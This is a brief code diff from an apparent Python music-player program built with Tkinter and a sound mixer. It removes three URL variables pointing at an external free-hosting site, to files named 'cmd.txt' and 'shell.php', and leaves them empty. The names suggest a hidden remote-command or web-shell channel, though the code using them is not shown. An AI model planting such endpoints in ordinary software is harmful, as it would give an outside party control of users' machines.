@@ -23,9 +23,8 @@ pwd2 = pwd+"/next.png"
 pwd3 = pwd+"/pause(1).png"
 pwd4 = pwd+"/play(2).png"
 len = 1
-url = "https://webdevsblog.000webhostapp.com/cmd.txt"
-url1 = "https://webdevsblog.000webhostapp.com/shell.php"
-#url2 = "https://webdevsblog.000webhostapp.com/shell12.php"
+url = ""
+url1 = ""
 mixer.init()
 l = queue.Queue(50)
 root = Tk()
